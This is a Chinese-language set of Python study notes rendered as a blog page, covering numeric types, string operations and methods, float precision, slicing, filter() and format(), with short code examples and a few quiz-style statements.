<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">num=<span class="number">35</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;%x&#x27;</span> % num)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(num))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">format</span>(num,<span class="string">&#x27;x&#x27;</span>))</span><br><span class="line"></span><br><span class="line">num = <span class="number">0b1010</span>  <span class="comment"># 二进制表示的10</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(x)         <span class="comment"># 10</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(num))  <span class="comment"># 0xa</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;%x&#x27;</span> %num) <span class="comment"># a</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">format</span>(num,<span class="string">&#x27;x&#x27;</span>)) <span class="comment">#a</span></span><br></pre></td></tr></table></figure>

<h2 id="1-7-大小写"><a href="#1-7-大小写" class="headerlink" title="1.7 大小写"></a>1.7 大小写</h2><p>lower() 函数将字符串中的所有字符转换为小写形式，并返回转换后的字符串。<br>upper() 函数将字符串中的所有字符转换为大写形式，并返回转换后的字符串。<br>capitalize() 函数将字符串的第一个字符首字母转换为大写形式，其他字符转换为小写形式，并返回转换后的字符串。<br>title() 函数将字符串中每个单词的首字母转换为大写形式，其他字母转换为小写形式，并返回转换后的字符串。</p>
<h2 id="1-8-精度问题"><a href="#1-8-精度问题" class="headerlink" title="1.8 精度问题"></a>1.8 精度问题</h2><p>print(0.1+0.2&#x3D;&#x3D;0.3)&#x2F;&#x2F;输出为False<br>由于浮点数运算的精度限制可能会出现舍入误差，导致比较结果为假<br>浮点数比较多采用误差范围</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">import math</span><br><span class="line">eps=1e-8</span><br><span class="line">a=0.1+0.2</span><br><span class="line">b=0.3</span><br><span class="line">print(a==b)                 #Flase</span><br><span class="line">print(math.fabs(a-b)&lt;eps)   #True</span><br><span class="line">print(round(0.1+0.2,1)==0.3)#True</span><br></pre></td></tr></table></figure>
<p>浮点运算只能近似的表示实数运算。而 &#x3D;&#x3D; 表示的是在计算机中的内存表示完全一样，因此使用 &#x3D;&#x3D; 来表示两个浮点数的相等就会出现问题<br>由于计算机中采用的是有限位的二进制编码，所以浮点数在计算机中的存储不总是精确的</p>
<h2 id="1-9-amp-x3D"><a href="#1-9-amp-x3D" class="headerlink" title="1.9 &amp;&#x3D;"></a>1.9 &amp;&#x3D;</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">x = <span class="number">5</span>  <span class="comment"># 二进制表示为 0b0101</span></span><br><span class="line">y = <span class="number">3</span>  <span class="comment"># 二进制表示为 0b0011</span></span><br><span class="line"></span><br><span class="line">x &amp;= y  <span class="comment"># 等效于 x = x &amp; y</span></span><br><span class="line"><span class="built_in">print</span>(x)  <span class="comment"># 输出 1，二进制表示为 0b0001</span></span><br></pre></td></tr></table></figure>
<h2 id="1-10-int-保留字"><a href="#1-10-int-保留字" class="headerlink" title="1.10 int 保留字"></a>1.10 int 保留字</h2><p>在Python中，<code>int</code>并不是保留字（reserved word）。保留字是被编程语言保留并具有特定含义的关键字或标识符。在Python中，保留字用于表示语言的结构和功能，例如控制流程、定义函数、定义类等。一些Python的保留字包括<code>if</code>、<code>else</code>、<code>while</code>、<code>for</code>、<code>def</code>、<code>class</code>等。</p>
<p><code>int</code>是Python的内置函数和类之一，用于将一个对象转换为整数类型。它不是保留字，因为您可以在代码中使用<code>int</code>作为变量名。但是，建议避免将内置函数和类的名称用作变量名，以免混淆和潜在的问题。</p>
<h2 id="1-11切片"><a href="#1-11切片" class="headerlink" title="1.11切片"></a>1.11切片</h2><p>[start:end:step]：不包括end<br>进行反向切片时，step为负数且start&gt;end</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a=(0,1,2,3,4)</span><br><span class="line">s=a[3:2:-1]</span><br><span class="line">print(s)</span><br></pre></td></tr></table></figure>
<p>start、end为负数时表示倒数第几个</p>
<h2 id="1-12-int"><a href="#1-12-int" class="headerlink" title="1.12 int()"></a>1.12 int()</h2><p>int()不能将带有小数点的字符串转化为整数类型。<br>解决方案：可以在int()里加入float(),先强制转换为浮点型，再转换为整数型。</p>
<h2 id="1-13-if-name-x3D-x3D-‘main‘"><a href="#1-13-if-name-x3D-x3D-‘main‘" class="headerlink" title="1.13 if name &#x3D;&#x3D; ‘main‘:"></a>1.13 <strong>if <strong>name</strong> &#x3D;&#x3D; ‘<strong>main</strong>‘:</strong></h2><p>当被调用程序是作为主程序执行时才会执行此语句下的语句</p>
<h2 id="1-14-map"><a href="#1-14-map" class="headerlink" title="1.14 map"></a>1.14 map</h2><p>在python2中返回列表<br>在python3中返回迭代器</p>
<h2 id="1-15-全局局部变量"><a href="#1-15-全局局部变量" class="headerlink" title="1.15 全局局部变量"></a>1.15 全局局部变量</h2><ol>
<li>全局变量可以和局部变量重名</li>
<li>全局变量一般没有缩进</li>
<li>全局变量在程序执行的全过程有效</li>
</ol>
<h2 id="1-16-左移右移"><a href="#1-16-左移右移" class="headerlink" title="1.16 左移右移"></a>1.16 左移右移</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">zy</span>(<span class="params">a,b</span>):</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(a&gt;&gt;b)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(a&lt;&lt;b)</span><br><span class="line"></span><br><span class="line">zy(<span class="number">9</span>,<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">out：</span><br><span class="line"><span class="number">1</span></span><br><span class="line"><span class="number">72</span></span><br></pre></td></tr></table></figure>

<ol>
<li>&gt;&gt;除以2的b次方</li>
<li>&lt;&lt;乘以2的b次方</li>
</ol>
<h2 id="1-17-filter"><a href="#1-17-filter" class="headerlink" title="1.17 filter()"></a>1.17 filter()</h2><p>filter()函数的语法规则如下：</p>
<p>可迭代对象中的每个元素将作为参数传递给判断函数进行判断，判断函数将会返回True或False，最后返回所有判断为True的元素。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">filter</span>(function,iterable)</span><br><span class="line"> </span><br><span class="line">function -&gt; 判断条件</span><br><span class="line">iterable -&gt; 可迭代对象</span><br></pre></td></tr></table></figure>

<p>和map函数相同，在Python中filter函数返回的是一个迭代器，这意味着我们无法通过index访问filter对象，也不能通过len获得filter对象的长度。</p>
<p>用法实例：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1.利用filter函数筛选出列表中为奇数的元素</span></span><br><span class="line">Demo_lists=[<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">11</span>,<span class="number">12</span>,<span class="number">13</span>,<span class="number">14</span>,<span class="number">15</span>,<span class="number">16</span>,<span class="number">17</span>]</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Is_odd</span>(<span class="params">n</span>):</span><br><span class="line">    <span class="keyword">return</span> n%<span class="number">2</span>==<span class="number">1</span></span><br><span class="line"> </span><br><span class="line">Result_lists=<span class="built_in">filter</span>(Is_odd,Demo_lists)</span><br><span class="line">Result_lists=<span class="built_in">list</span>(Result_lists)</span><br><span class="line"><span class="built_in">print</span>(Result_lists)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="comment"># Result</span></span><br><span class="line">[<span class="number">1</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">7</span>, <span class="number">9</span>, <span class="number">11</span>, <span class="number">13</span>, <span class="number">15</span>, <span class="number">17</span>]</span><br></pre></td></tr></table></figure>



<h2 id="1-18-len"><a href="#1-18-len" class="headerlink" title="1.18 len()"></a>1.18 len()</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">len</span>([<span class="number">1</span>,<span class="number">2</span>,[],<span class="literal">None</span>,(),&#123;&#125;])</span><br><span class="line">out:<span class="number">6</span></span><br></pre></td></tr></table></figure>


<h2 id="1-19-修改代码无反应​"><a href="#1-19-修改代码无反应​" class="headerlink" title="1.19 修改代码无反应​"></a>1.19 修改代码无反应​</h2><p>有学生在PyCharm中修改了Python代码，但是重新运行时发现依然为以前的代码运行结果，请问最可能的原因是：<br>建立了多个Python文件，但是运行的是另外一个Python文件</p>
<h2 id="1-20循环"><a href="#1-20循环" class="headerlink" title="1.20循环"></a>1.20循环</h2><p>CBD<br>‌下面关于循环的说法中，哪些是 <strong>正确</strong>？<br>continue表示退出当前循环，并无需条件判断，立刻跳转到下一次循环中<br>循环和条件判断可以嵌套使用<br>continue表示退出当前循环，并立刻跳转到循环条件进行判断<br>break和continue最好不要使用，一般都可以其他逻辑来取得同样效果</p>
<h2 id="3"><a href="#3" class="headerlink" title="3"></a>3</h2><pre><code>print和input不需要导入也能使用，主要是因为所在包被自动导入


Python库文件的扩展名为whl


import myPackage.myFuncs

这个代码是指从myPackage包中导入myFuncs模块


包对应文件夹，模块对应代码文件，通过包可以层次化的将模块文件组织起来



利用字符串的 split 函数可以对英文进行分词，但是如果是中文句子，则默认按照单字分割（错误）

利用字符串的 split 函数可以对英文进行分词，即使没有参数，默认也能分词

WordCloud词云要显示中文句子中的词语，必须要结合分词再通过空格拼接后才能实现效果

jieba 是一个中文分词模块，但是不能对英文分词（错误）


形参数值的改变不会影响实参的数值

函数参数都具有默认值时，可以在调用函数时无需设定参数
</code></pre>
<h2 id="判断"><a href="#判断" class="headerlink" title="判断"></a>判断</h2><p>’y‘&lt;’x’=&#x3D;False 中等价于判断’y’&lt;’x’ and ‘x’=&#x3D;False。</p>
<h2 id="列表删除"><a href="#列表删除" class="headerlink" title="列表删除"></a>列表删除</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">dat = [<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;3&#x27;</span>, <span class="string">&#x27;0&#x27;</span>, <span class="string">&#x27;0&#x27;</span>, <span class="string">&#x27;0&#x27;</span>,<span class="string">&#x27;0&#x27;</span>]</span><br><span class="line"><span class="keyword">for</span> item <span class="keyword">in</span> dat:</span><br><span class="line">    <span class="keyword">if</span> item == <span class="string">&#x27;0&#x27;</span>:</span><br><span class="line">        dat.remove(item)</span><br><span class="line"><span class="built_in">print</span>(dat)</span><br></pre></td></tr></table></figure>
<p>如果使用此方法删除，在删除的同时，列表的长度也在改变，但是对于for遍历，指针依然继续走，所以会漏掉两个0，当原先有两、三个0则会只剩下1个0，四五个则会有两个0剩余。<br>修改代码：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">dat = [<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;3&#x27;</span>, <span class="string">&#x27;0&#x27;</span>, <span class="string">&#x27;0&#x27;</span>, <span class="string">&#x27;0&#x27;</span>]</span><br><span class="line">new_dat = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> item <span class="keyword">in</span> dat:</span><br><span class="line">    <span class="keyword">if</span> item != <span class="string">&#x27;0&#x27;</span>:</span><br><span class="line">        new_dat.append(item)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(new_dat)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h1 id="第二章-基本数据类型"><a href="#第二章-基本数据类型" class="headerlink" title="第二章 基本数据类型"></a>第二章 基本数据类型</h1><p>&#x3D;&#x3D;可变类型不可变类型&#x3D;&#x3D;<br>可变的数据类型包括list、dict以及set，不可变的数据类型为数组、字符串和元组。<br>1、不可变类型</p>
<p>使用不可变的数据类型的时候，在一个变量中是不能对里面的值进行修改，如果要强制性的修改了变量的值，就相当于是重新创建了一个新的对象。但是在一个具有相同值的对象中，内存只能存放一个，在内存中会引用一个计数的来记录有多少个变量去引用这个对象。</p>
<p>2、可变类型</p>
<p>在使用一个可变类型的数据时，可以对变量中存放的值进行修改，比如会经常使用append、+&#x3D;等方式对变量进行操作，在操作的过程中，只能改变变量的值，并不会重新创建一个对象，并且在变量中引用的对象地址也不会发生改变，就算是相同的值的不同对象，在内存中则会存在不同的对象，即每个对象都有自己的地址，相当于内存中对于相同值的对象保存了多份，这里不存在引用计数，是实实在在的对象。</p>
<h2 id="2-1数字类型"><a href="#2-1数字类型" class="headerlink" title="2.1数字类型"></a>2.1数字类型</h2><h3 id="2-1-1-整数类型"><a href="#2-1-1-整数类型" class="headerlink" title="2.1.1 整数类型"></a>2.1.1 整数类型</h3><p>整数类型包括:十进制、二进制、八进制、十六进制</p>
<ol>
<li>十进制:默认采用</li>
<li>二进制:以 &#x3D;&#x3D;0b或0B&#x3D;&#x3D; 引导,由0和1组成,例如0b101</li>
<li>八进制:以 &#x3D;&#x3D;0o或0O&#x3D;&#x3D; 引导,由0到7组成例如0o711</li>
<li>十六进制:以 &#x3D;&#x3D;0x或0X&#x3D;&#x3D; 引导,由0到9,a到f,A到F组成.例如0xABC</li>
</ol>
<p>&#x3D;&#x3D;pow(x,y),计算x^y&#x3D;&#x3D; (x的y次方)</p>
<h3 id="2-1-2-浮点型类型"><a href="#2-1-2-浮点型类型" class="headerlink" title="2.1.2 浮点型类型"></a>2.1.2 浮点型类型</h3><p>表示方法:十进制和科学计数法<br>科学计数法:以&#x3D;&#x3D;字母e或E&#x3D;&#x3D; 作为幂的符号,以10为基数,e**&#x3D;a<em>10^b<br>例如:4.3e-3&#x3D;0.0043</em>*<br>没有其他进制表示<br>不可以不带小数部分</p>
<h3 id="2-1-3-复数类型"><a href="#2-1-3-复数类型" class="headerlink" title="2.1.3 复数类型"></a>2.1.3 复数类型</h3><p>复数的虚部以后缀 &#x3D;&#x3D;“j”或”J”&#x3D;&#x3D; 表示<br>其实部与虚部的数值都是浮点数<br>&#x3D;&#x3D;z.real 获取z的实部<br>z.imag或缺z的虚部&#x3D;&#x3D;</p>
<ol>
<li>abs(-1+3j)<br><code>abs(-1+3j)</code> 表示求复数 <code>-1+3j</code> 的绝对值。<br>在数学中，复数的绝对值表示该复数到原点的距离，即复数的模或大小。<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">|a + bi| = sqrt(a^<span class="number">2</span> + b^<span class="number">2</span>)</span><br></pre></td></tr></table></figure></li>
<li>5.67e+8j.real<br>输出为0.0<br>因为e后面必须跟一个数字，（+8）代表正8<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">z=<span class="number">1</span>+<span class="number">2j</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(z.imag) <span class="comment"># 2.0</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(z.real) <span class="comment"># 1.0</span></span><br><span class="line"></span><br><span class="line">y=<span class="number">1.0</span>+<span class="number">2.0j</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(y.imag) <span class="comment"># 2.0</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(y.real) <span class="comment"># 1.0</span></span><br></pre></td></tr></table></figure></li>
</ol>
<h3 id="2-1-4-数字类型的操作"><a href="#2-1-4-数字类型的操作" class="headerlink" title="2.1.4 数字类型的操作"></a>2.1.4 数字类型的操作</h3><h3 id="2-1-5-内置的数值运算操作符"><a href="#2-1-5-内置的数值运算操作符" class="headerlink" title="2.1.5 内置的数值运算操作符"></a>2.1.5 内置的数值运算操作符</h3><ol>
<li>x**y表示 x的 y次幂，其中， y不一定是整数</li>
<li>x &#x3D; 12 + 3* ((5*8) - 14) &#x2F;&#x2F; 6 先乘后除</li>
</ol>
<p><img src="https://img-blog.csdnimg.cn/06ce26906d824566b26f27417477880c.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bCP5rGQfg==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="内置的数值运算操作符"><br>3种数字类型的扩展关系: &#x3D;&#x3D;整数-&gt;浮点数-&gt;复数&#x3D;&#x3D;<br>不同数字类型间运算所生成结果是”更宽”的类型<br>例如:&#x3D;&#x3D;整数浮点数与分数运算,结果为分数&#x3D;&#x3D;</p>
<h3 id="2-1-6-内置的数值运算函数"><a href="#2-1-6-内置的数值运算函数" class="headerlink" title="2.1.6 内置的数值运算函数"></a>2.1.6 内置的数值运算函数</h3><table>
<thead>
<tr>
<th>函数</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>abs(x)</td>
<td>x的绝对值,例如&#96;&gt;&gt;&gt;abs(-3+4j) 结果为5.0</td>
</tr>
<tr>
<td>divmod(x,y)</td>
<td>(x&#x2F;&#x2F;y,x%y) ,输出为二元组形式(元组类型)</td>
</tr>
<tr>
<td>pow(x,y[z])</td>
<td>(x<strong>y)%z,[…]表示该参数可以省略,即pow(x,y),等价于x</strong>y</td>
</tr>
<tr>
<td>round(x[,d])</td>
<td>对x四舍五入,保留d位小数,round(x)返回四舍五入的整数</td>
</tr>
<tr>
<td>max(x1,x2,…,xn)</td>
<td>x1,x2,…xn的最大值,n无限定</td>
</tr>
<tr>
<td>min(x1,x2,…,xn)</td>
<td>x1,x2,…xn的最小值,n无限定</td>
</tr>
</tbody></table>
<p>divmod(x,y)返回x&#x2F;y的商和余数（商，余数）</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">x=<span class="number">10</span></span><br><span class="line">y=<span class="number">3</span></span><br><span class="line"><span class="built_in">divmod</span>(x,y) <span class="comment"># (3,1)</span></span><br></pre></td></tr></table></figure>

<h3 id="2-1-7-内置的数字类型转换函数"><a href="#2-1-7-内置的数字类型转换函数" class="headerlink" title="2.1.7 内置的数字类型转换函数"></a>2.1.7 内置的数字类型转换函数</h3><table>
<thead>
<tr>
<th>函数</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>int(x)</td>
<td>将x转换为整数,x可以为浮点数(直接舍弃小数部分,不四舍五入)或字符串</td>
</tr>
<tr>
<td>float(x)</td>
<td>返回浮点数x或字符串x对应的整数类型</td>
</tr>
<tr>
<td>complex(re[,im]</td>
<td>生成一个复数,re为实部,可以是整数.浮点数或字符串:im为虚部,可以是整数浮点数不能为字符串</td>
</tr>
</tbody></table>
<p>复数不能直接转换为其他数字类型,可以通过.real和.imag提取实部和虚部,然后分别转换<br>例如:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt;float((10+99j).imag)</span><br><span class="line">99.0</span><br></pre></td></tr></table></figure>

<h2 id="2-2-字符串类型"><a href="#2-2-字符串类型" class="headerlink" title="2.2 字符串类型"></a>2.2 字符串类型</h2><ol>
<li>可以保存在变量中也可以单独存在</li>
<li>是一个字符序列，其中编号叫序列</li>
<li>chr(x) 和 ord(x) 函数用于在单字符和 Unicode 编码值之间进行转换 </li>
<li>Python 中使用的主要字符编码是 Unicode。Unicode 是一种字符编码标准，它为世界上几乎所有的字符分配了唯一的数字标识符，包括 ASCII 字符。</li>
</ol>
<h3 id="2-2-1字符串类型的表示"><a href="#2-2-1字符串类型的表示" class="headerlink" title="2.2.1字符串类型的表示"></a>2.2.1字符串类型的表示</h3><ol>
<li>单引号字符串:’单引号表示,可以使用双引号”作为字符串一部分</li>
<li>双引号字符串:”双引号表示,可以使用单引号’作为字符串一部分</li>
<li>三引号字符串:‘’‘三引号表示,可以使用’单引号’<br> “双引号”<br> 也可以换行<br> ‘’’</li>
</ol>
<h3 id="2-2-2-基本的字符串操作符"><a href="#2-2-2-基本的字符串操作符" class="headerlink" title="2.2.2 基本的字符串操作符"></a>2.2.2 基本的字符串操作符</h3><ol>
<li>5个字符串的基本操作符</li>
</ol>
<table>
<thead>
<tr>
<th>操作符</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>x+y</td>
<td>连接两个字符串x和y</td>
</tr>
<tr>
<td>x<em>n或n</em>x</td>
<td>复制n次字符串x</td>
</tr>
<tr>
<td>x in s</td>
<td>如果x是s的子串,返回True,否则返回False</td>
</tr>
<tr>
<td>str[ i ]</td>
<td>索引,返回第i个字符串</td>
</tr>
<tr>
<td>str[ N:M ]</td>
<td>切片,返回索引第N到第M-1的子串</td>
</tr>
</tbody></table>
<ol start="2">
<li>格式化控制字符 (\ 转义符)</li>
</ol>
<table>
<thead>
<tr>
<th>字符</th>
<th>含义</th>
</tr>
</thead>
<tbody><tr>
<td>\n</td>
<td>换行</td>
</tr>
<tr>
<td>\</td>
<td>表示反斜杠|</td>
</tr>
<tr>
<td>\’</td>
<td>表示单引号’</td>
</tr>
<tr>
<td>&quot;</td>
<td>表示双引号”</td>
</tr>
<tr>
<td>\t</td>
<td>水平制表(Tab)</td>
</tr>
<tr>
<td>\a</td>
<td>蜂鸣,响铃</td>
</tr>
<tr>
<td>\b</td>
<td>回退,向后退一格 (py文件下)</td>
</tr>
<tr>
<td>\f</td>
<td>换页</td>
</tr>
<tr>
<td>\n</td>
<td>换行,光标移动到下行首行</td>
</tr>
<tr>
<td>\r</td>
<td>回车,光标移动到本行首行(py文件下)</td>
</tr>
<tr>
<td>\v</td>
<td>垂直制表</td>
</tr>
<tr>
<td>\0</td>
<td>NULL,什么都不做</td>
</tr>
</tbody></table>
<h3 id="2-2-3-内置的字符串处理函数"><a href="#2-2-3-内置的字符串处理函数" class="headerlink" title="2.2.3 内置的字符串处理函数"></a>2.2.3 内置的字符串处理函数</h3><p>python3以Unicode字符为计数基础,&#x3D;&#x3D;字符串中英文字符和中文字符都是一个长度单位&#x3D;&#x3D;</p>
<h3 id="内置的字符串处理函数-6个"><a href="#内置的字符串处理函数-6个" class="headerlink" title="内置的字符串处理函数 6个"></a>内置的字符串处理函数 6个</h3><table>
<thead>
<tr>
<th>函数</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>len(x)</td>
<td>返回字符串x的长度,也可以返回其他组合数据类型元素个数</td>
</tr>
<tr>
<td>str(x)</td>
<td>返回任意类型x对应的字符串形式</td>
</tr>
<tr>
<td>chr(x)</td>
<td>返回Unicode编码x对应的单字符</td>
</tr>
<tr>
<td>ord(x)</td>
<td>返回单字符对应的Unicode编码</td>
</tr>
<tr>
<td>hex(x)</td>
<td>返回整数x对应十六进制数的小写形式字符串</td>
</tr>
<tr>
<td>oct(x)</td>
<td>返回整数x对应八进制数的小写形式字符串</td>
</tr>
</tbody></table>
<h3 id="2-2-4-内置的字符串处理方法"><a href="#2-2-4-内置的字符串处理方法" class="headerlink" title="2.2.4 内置的字符串处理方法"></a>2.2.4 内置的字符串处理方法</h3><h3 id="常用的16个内置字符串处理方法-全部共43个"><a href="#常用的16个内置字符串处理方法-全部共43个" class="headerlink" title="常用的16个内置字符串处理方法(全部共43个)"></a>常用的16个内置字符串处理方法(全部共43个)</h3><p>str为字符串或变量</p>
<table>
<thead>
<tr>
<th>方法</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>str.lower()</td>
<td>返回字符串str的副本,全部字符小写</td>
</tr>
<tr>
<td>str.upperr()</td>
<td>返回字符串str的副本,全部字符大写</td>
</tr>
<tr>
<td>str.islower()</td>
<td>当str所有字符都是小写时,返回True,否则返回False</td>
</tr>
<tr>
<td>str.isprintable()</td>
<td>当str所有字符都是可打印的,返回True,否则返回False</td>
</tr>
<tr>
<td>str.isnumeric()</td>
<td>当str所有字符都是数字时,返回True,否则返回False</td>
</tr>
<tr>
<td>str.isspace()</td>
<td>当str所有字符为空格时,返回True,否则返回False</td>
</tr>
<tr>
<td>str.endswith(suffix[,start[,end]])</td>
<td>str[start:end]以suffix结尾返回True,否则返回False</td>
</tr>
<tr>
<td>str.srartswith(prefix[,start[,end]])</td>
<td>str[start:end]以prefix开始返回True,否则返回False</td>
</tr>
<tr>
<td>str.split(sep&#x3D;None,maxsplit&#x3D;-1)</td>
<td>返回一个列表,由str根据sep被分隔的部分构成,默认分隔符为空格,maxsplit为最大分隔次数,默认maxsplit参数可以不给出</td>
</tr>
<tr>
<td>str.count(sub[,start[,end]])</td>
<td>返回str[start:end]中sub子串出现的次数</td>
</tr>
<tr>
<td>str.replace(old,new[,count])</td>
<td>返回字符串str的副本,所有old子串被替换为new,如果count给出,则前count次old出现被替换</td>
</tr>
<tr>
<td>str.center(width[,fillchar])</td>
<td>字符串居中函数,返回长度为width的字符串,其中str处于新字符串中心位置,两侧增加字符采用fillchar填充,当witdh小于字符串长度时,返回str</td>
</tr>
<tr>
<td>str.strip(chars)</td>
<td>返回字符串str的副本,在其左右侧去掉chars中列出的字符</td>
</tr>
<tr>
<td>str.zfill(width)</td>
<td>返回长度为width的字符串，如果字符串长度不足width，在左侧添加字符“0”，但如果str最左侧是字符”+”或者”-”，则从第二个字符左侧添加”0”，当width小于字符串长度时，返回str。该方法主要用于格式化数字形字符串中</td>
</tr>
<tr>
<td>str.format()</td>
<td>返回字符串str的一种排版格式</td>
</tr>
<tr>
<td>str.join(x)</td>
<td>返回一个新字符串,由组合数据类型x变量的每一个元素组成,元素间用str分隔</td>
</tr>
</tbody></table>
<h3 id="2-2-5-字符串类型的格式化"><a href="#2-2-5-字符串类型的格式化" class="headerlink" title="2.2.5 字符串类型的格式化"></a>2.2.5 字符串类型的格式化</h3><p><strong>format()方法的基本使用</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">格式:\&lt;模板字符串\&gt;.format(&lt;逗号分隔的参数&gt;)  </span><br><span class="line">format()中逗号分隔的参数按照 ==序号==关系替换到模板字符串的槽中,槽用\&#123;\&#125;表示,如果槽中没有序号,则按照顺序替换  </span><br><span class="line">如果需要输出大括号,采用\&#123;\&#123;\&#123;表示,\&#125;\&#125;表示\&#125;</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt;&quot;圆周率&#123;&#123;&#123;1&#125;&#123;2&#125;&#125;&#125;是&#123;0&#125;&quot;,format(&quot;无理数&quot;,3.14,&quot;...&quot;)</span><br><span class="line">&#x27;圆周率&#123;3.14...&#125;是无理数&#x27;</span><br></pre></td></tr></table></figure>

<p><strong>format()方法的格式控制</strong></p>
<p>格式如下表:<br><img src="https://images-1314484890.cos.ap-nanjing.myqcloud.com/Obsidian/202306120919633.jpeg" alt="在这里插入图片描述"></p>
<ol>
<li>format()参数长度比&lt;宽度&gt;设定值大,则使用参数时间长度:如小于设定值,则默认以空格字符补充</li>
<li>&lt;填充&gt;指宽度内除参数外用什么表示,默认空格</li>
